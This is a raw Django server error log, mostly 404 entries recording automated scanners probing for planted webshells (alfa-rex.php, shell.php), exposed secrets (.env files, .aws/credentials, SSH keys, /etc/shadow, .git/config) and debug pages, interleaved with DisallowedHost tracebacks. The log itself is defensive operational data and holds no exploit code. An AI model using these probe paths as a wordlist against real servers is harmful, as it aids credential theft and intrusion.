Not Found: /.well-knownold/inputs.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /wp-includes/random_compat/chosen.php
Not Found: /assets/images/about.php
Not Found: /wp-content/uploads/json.php
Not Found: /wp-includes/wp-includes/about.php
Not Found: /wp-content/themes/wp-pridmag/lock.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/coffee/about.php
Not Found: /browse.php
Not Found: /shell20211028.php
Not Found: /wp-content/themes/twenty/twenty.php
Not Found: /wp-content/themes/twentytwentytwo/alfa-rex.php
Not Found: /index/lock.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/theme-compat/chosen.php
Not Found: /wp-content/config.php
Not Found: /moon.php
Not Found: /wp-includes/ID3/index.php
Not Found: /wp-admin/css/wp-conflg.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /css/chosen.php
Not Found: /wp-includes/Requests/Utility/cc.php
Not Found: /wp-includes/Text/index.php
Not Found: /packed.php
Not Found: /wp-admin/update.php
Not Found: /wp-content/themes/astra/inc/fm.php
Not Found: /link.php
Not Found: /wp-content/mu-plugins/gecko.php
Not Found: /footer.php
Not Found: /wp-includes/js/codemirror/index.php
Not Found: /config.php
Not Found: /fw.php
Not Found: /post.php
Not Found: /ALFA_DATA/index.php
Not Found: /wp-admin/css/colors/blue/moon.php
Not Found: /wp-content/themes/wp-pridmag/up.php
Not Found: /wp-includes/html-api/alfa-rex.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-admin/includes/m.php
Not Found: /images/admin.php
Not Found: /wp-admin/user/admin.php
Not Found: /wp-includes/IXR/shell.php
Not Found: /wp-trackback.php
Not Found: /wp-content/content.php
Not Found: /wp-admin/wp-conflg.php
Not Found: /wp-includes/Requests/Utility/alfa-rex.php
Not Found: /wp-content/upgrade-temp-backup/ty.php
Not Found: /.well-known/content.php
Not Found: /index/index.php
Not Found: /wp-includes/autoload_classmap.php
Not Found: /include/wp-configs.php
Not Found: /wp-admin/js/chosen.php
Not Found: /wp-admin/maint/about.php
Not Found: /wp-includes/sodium_compat/alfa-rex.php
Not Found: /bg/xmrlpc.php
Not Found: /wp-content/plugins/core-plugin/file-manager.php
Not Found: /wp-content/uploads/423_index.php
Not Found: /wp-admin/network/wp-conflg.php
Not Found: /wp-admin/css/colors/blue/atomlib.php
Not Found: /wp-admin/byp.php
Not Found: /wp-includes/theme-compat/index.php
Not Found: /wp-content/wp-login.php
Not Found: /chosen.php
Not Found: /wp-includes/images/smilies/index.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /wp-includes/html-api/about.php
Not Found: /wp-content/uploads/index.php
Not Found: /wp-includes/images/smilies/about.php
Not Found: /assets/plugins/jquery-file-upload/server/php/include.php
Not Found: /images/lmfi2.php
Not Found: /wp-admin/function.php
Not Found: /wp-includes/Text/Diff/alfa-rex.php
Not Found: /images/chosen.php
Not Found: /mah.php
Not Found: /wp-content/json.php
Not Found: /wp-includes/fonts/index.php
Not Found: /wp-includes/Requests/file.php
Not Found: /wp-content/themes/seotheme/classwithtostring.php
Not Found: /wp-includes/widgets/parx.php
Not Found: /wp-content/plugins/Cache/footer.php
Not Found: /content.php
Not Found: /wp-includes/css/wp-conflg.php
Not Found: /wp-admin/admin-post.php
Not Found: /wp-includes/html-api/chosen.php
Not Found: /wp-admin/includes/cong.php
Not Found: /wp-admin/network/shell.php
Not Found: /cgi-bin/upfile.php
Not Found: /wp-includes/images/smilies/wp-login.php
Not Found: /cong.php
Not Found: /wp-login.php
Not Found: /makeasmtp.php
Not Found: /wp-admin/css/colors/blue/lock.php
Not Found: /wp-content/plugins/pwnd/classwithtostring.php
Not Found: /wp-includes/Text/Diff/Renderer/about.php
Not Found: /13.php
Not Found: /wp-includes/sodium_compat/index.php
Not Found: /.well-known/cache-compat.php
Not Found: /wp-mail.php/wp-includes/ID3/rnEPv9.php
Not Found: /wp-includes/php-compat/content.php
Not Found: /wp-includes/fonts/admin.php
Not Found: /doc.php
Not Found: /wp-includes/block-patterns/autoload_classmap.php
Not Found: /wp-includes/images/autoload_classmap.php
Not Found: /wp-includes/certificates/index.php
Not Found: /.well-known/pki-validation/wp-login.php
Not Found: /css/install.php
Not Found: /wp-includes/theme-compat/wp-conflg.php/wp-content/plugins/google-seo-rank/index.php
Not Found: /xmrlpc.php
Not Found: /wp-admin/css/colors/classwithtostring.php
Not Found: /wp-includes/index.php
Not Found: /wp-includes/fonts/install.php
Not Found: /assets/edit.php
Not Found: /file.php
Not Found: /wp-admin/index.php
Not Found: /wp-includes/Text/Diff/Engine/wp-login.php
Not Found: /wp-admin/user/chosen.php
Not Found: /wp-content/uploads/wp-conflg.php
Not Found: /ok.php
Not Found: /wp-includes/IXR/alfa-rex.php
Not Found: /wp-admin/autoload_classmap.php
Not Found: /wp-includes/sodium_compat/src/index.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-includes/css/alfa-rex.php
Not Found: /images/stories/admin-post.php
Not Found: /containers/json
Not Found: /version
Not Found: /.env.bak
Not Found: /containers/json
Not Found: /.env
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /.git/config
Not Found: /wp-login.php
Not Found: //.env
Not Found: /.env
Not Found: /.env~
Not Found: /.env.bak
Not Found: /.env.backup
Not Found: /.env.example
Not Found: /local.env
Not Found: /backend/.env
Not Found: /.vscode/sftp.json
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /Blogs/index.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /index.html
Not Found: /contact.html
Not Found: /index.html
Not Found: /youtube-video-downloader/index.html/
Not Found: /Blogs/contact.html
Not Found: /contact/index.html
Not Found: /contact/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /index.html
Not Found: /contact.html
Not Found: /youtube-video-downloader/contact.html/
Not Found: /robots.txt
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /.git/index
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /robots.txt
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /youtube-video-downloader/contact.html/
Not Found: /youtube-video-downloader/index.html/
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /hudson
Not Found: /robots.txt
Not Found: /appsettings.json
Not Found: /appsettings.Production.json
Not Found: /api/appsettings.json
Not Found: /api/appsettings.Production.json
Not Found: /wp-login.php
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /wp-content/uploads/
Not Found: /wp-includes/
Not Found: /wp-includes/css/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/Text/
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-content/themes/classic/inc/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /wp-content/mu-plugins/
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/images/
Not Found: /.well-known/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /cgi-bin/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /uploads/
Not Found: /upload/
Not Found: /Admin/uploads/
Not Found: /images/
Not Found: /assets/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/
Not Found: /upload/image/
Not Found: /assets/images/
Not Found: /Public/
Not Found: /vendor/
Not Found: /local/
Not Found: /modules/
Not Found: /Site/
Not Found: /system/
Not Found: /template/
Not Found: /shop/
Not Found: /files/
Not Found: /include/
Not Found: /Assets/
Not Found: /images/stories/
Not Found: /plugins/
Not Found: /php/
Not Found: /wp-includes/assets/
Not Found: /wp-includes/Text/Diff/Engine/
Not Found: /wp-includes/block-patterns/
Not Found: /wp-includes/Text/Diff/
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /wp-includes/css/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /wp-includes/rest-api/endpoints/
Not Found: /wp-includes/rest-api/fields/
Not Found: /wp-includes/Requests/Cookie/
Not Found: /wp-includes/Requests/Proxy/
Not Found: /wp-includes/Requests/Response/
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-includes/Requests/Utility/
Not Found: /wp-includes/js/codemirror/
Not Found: /wp-includes/Requests/Exception/HTTP/
Not Found: /wp-includes/js/crop/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/images/media/
Not Found: /wp-includes/images/smilies/
Not Found: /wp-includes/images/wlw/
Not Found: /wp-includes/rest-api/search/
Not Found: /wp-includes/Requests/Exception/
Not Found: /wp-includes/Requests/Auth/
Not Found: /wp-includes/sodium_compat/src/
Not Found: /wp-includes/sitemaps/providers/
Not Found: /wp-includes/Text/Diff/Engine/Engine/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/html-api/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/images/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/js/
Not Found: /wp-includes/php-compat/
Not Found: /wp-includes/PHPMailer/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/random_compat/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/rest-api/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/sitemaps/
Not Found: /wp-includes/sodium_compat/
Not Found: /wp-includes/style-engine/
Not Found: /wp-includes/Text/
Not Found: /wp-includes/theme-compat/
Not Found: /wp-includes/widgets/
Not Found: /wp-admin/css/colors/ectoplasm/
Not Found: /wp-admin/css/colors/
Not Found: /sites/default/files/
Not Found: /modules/mod_simplefileuploadv1.3/elements/
Not Found: /components/
Not Found: /wp-includes/js/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/rest-api/
Not Found: /wp-includes/widgets/
Not Found: /wp-admin/css/
Not Found: /wp-admin/images/
Not Found: /wp-admin/maint/
Not Found: /wp-admin/meta/
Not Found: /wp-admin/network/
Not Found: /wp-admin/user/
Not Found: /wp-content/
Not Found: /wp-content/plugins/
Not Found: /wp-content/themes/
Not Found: /wp-admin/includes/
Not Found: /wp-admin/
Not Found: /wp-content/upgrade/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /odinhttpcall1738783383
Not Found: /sdk
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /evox/about
Not Found: /HNAP1
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /query
Not Found: /solr/admin/info/system
Not Found: /cgi-bin/authLogin.cgi
Not Found: /solr/admin/cores
Not Found: /contact//
Not Found: /contact.html/
Not Found: /v2/_catalog
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /conf/.env
Not Found: /wp-content/.env
Not Found: /wp-admin/.env
Not Found: /library/.env
Not Found: /new/.env
Not Found: /vendor/.env
Not Found: /old/.env
Not Found: /local/.env
Not Found: /api/.env
Not Found: /blog/.env
Not Found: /crm/.env
Not Found: /laravel/.env
Not Found: /app/.env
Not Found: /app/config/.env
Not Found: /apps/.env
Not Found: /audio/.env
Not Found: /cgi-bin/.env
Not Found: /backend/.env
Not Found: /src/.env
Not Found: /base/.env
Not Found: /core/.env
Not Found: /vendor/laravel/.env
Not Found: /storage/.env
Not Found: /protected/.env
Not Found: /newsite/.env
Not Found: /www/.env
Not Found: /sites/all/libraries/mailchimp/.env
Not Found: /database/.env
Not Found: /public/.env
Not Found: /__tests__/test-become/.env
Not Found: /redmine/.env
Not Found: /gists/cache
Not Found: /uploads/.env
Not Found: /lib/.env
Not Found: /sendgrid.env
Not Found: /aws.env
Not Found: /.env.example
Not Found: /main/.env
Not Found: /docs/.env
Not Found: /client/.env
Not Found: /.env.dev
Not Found: /blogs/.env
Not Found: /shared/.env
Not Found: /download/.env
Not Found: /.env.php
Not Found: /site/.env
Not Found: /sites/.env
Not Found: /web/.env
Not Found: /_profiler/phpinfo
Not Found: /tool/view/phpinfo.view.php
Not Found: /debug/default/view.html
Not Found: /debug/default/view
Not Found: /frontend/web/debug/default/view
Not Found: /web/debug/default/view
Not Found: /sapi/debug/default/view
Not Found: /debug/default/view
Not Found: /phpinfo.php
Not Found: /phpinfo
Not Found: /aws.yml
Not Found: /.env.bak
Not Found: /info.php
Not Found: /.aws/credentials
Not Found: /config/aws.yml
Not Found: /config.js
Not Found: /symfony/public/_profiler/phpinfo
Not Found: /debug/default/view
Not Found: /symfony/public
Not Found: /debug/default/view
Not Found: /frontend_dev.php
Not Found: /debug/default/view
Not Found: /tool/view/phpinfo.view.php
Not Found: /%C0
Not Found: /debug/default/view.html
Not Found: /debug/default/view
Not Found: /frontend/web/debug/default/view
Not Found: /web/debug/default/view
Not Found: /sapi/debug/default/view
Not Found: /debug/default/view
Not Found: /shell
Not Found: /.env
Not Found: /actuator/gateway/routes
Not Found: /.env
Not Found: /.env
Not Found: /secrets.yml
Not Found: /config/secrets.yml
Not Found: /test/config/secrets.yml
Not Found: /redmine/config/secrets.yml
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /.git/config
Not Found: /.git/config
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /.env
Not Found: /.env
Not Found: /.env
Not Found: /atom.xml
Not Found: /robots.txt
Not Found: /contact.html
Not Found: /sitemaps.xml
Not Found: /robots.txt
Not Found: /sitemap.txt
Not Found: /robots.txt
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /chosen.php
Not Found: /sitemap_index.xml
Not Found: /sitemap.xml.gz
Not Found: /sitemap.xml.gz
Not Found: /actuator/health
Not Found: /l.php
Not Found: /wordpress
Not Found: /wp
Not Found: /wp-admin/setup-config.php
Not Found: /wp-admin/install.php
Not Found: /blog
Not Found: /new
Not Found: /old
Not Found: /newsite
Not Found: /test
Not Found: /core
Not Found: /testing
Not Found: /home
Not Found: /assets/plugins/jquery.filer/php/readme.txt
Not Found: /assets/vendor/jquery.filer/php/readme.txt
Not Found: /plugins/jquery.filer/php/readme.txt
Not Found: /assets/admin/bower_components/jquery.filer/php/readme.txt
Not Found: /jquery.filer/php/readme.txt
Not Found: /.env
Not Found: /portal/redlion
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /sitemap
Not Found: /index.html
Not Found: /contact.html
Not Found: /.env
Not Found: /youtube-video-downloader/contact.html/
Not Found: /atom.xml
Not Found: /.env
Not Found: /sitemap.xml.gz
Not Found: /Blogs/index.html
Not Found: /backup.sql
Not Found: /.env.production
Not Found: /.ssh/id_ecdsa
Not Found: /server.key
Not Found: /_vti_pvt/service.pwd
Not Found: /config.yaml
Not Found: /web.config
Not Found: /feed
Not Found: /_vti_pvt/authors.pwd
Not Found: /.ssh/id_rsa
Not Found: /phpinfo.php
Not Found: /config/database.php
Not Found: /server-status
Not Found: /wp-admin/setup-config.php
Not Found: /config.xml
Not Found: /user_secrets.yml
Not Found: /config.json
Not Found: /dump.sql
Not Found: /.git/HEAD
Not Found: /.kube/config
Not Found: /etc/shadow
Not Found: /backup.tar.gz
Not Found: /config/production.json
Not Found: /.svn/wc.db
Not Found: /.ssh/id_ed25519
Not Found: /backup.zip
Not Found: /cloud-config.yml
Not Found: /config.php
Not Found: /config.yml
Not Found: /_vti_pvt/administrators.pwd
Not Found: /.vscode/sftp.json
Not Found: /secrets.json
Not Found: /database.sql
Not Found: /api/.env
Not Found: /docker-compose.yml
Not Found: /etc/ssl/private/server.key
Not Found: /.aws/credentials
Not Found: /.env
Not Found: /Blogs/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /actuator/gateway/routes
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /geju.php
Not Found: /wp-content/plugins/about.php
Not Found: /wp.php
Not Found: /hoot.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /news/pta-set-to-grant-starlink-license-for-ultra-fast-internet-connectivity/index.html
Not Found: /robots.txt
Not Found: /api/sonicos/auth
Not Found: /auth1.html
Not Found: /api/sonicos/tfa
Not Found: /sslvpnLogin.html
Not Found: /auth.html
Not Found: /wsman
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
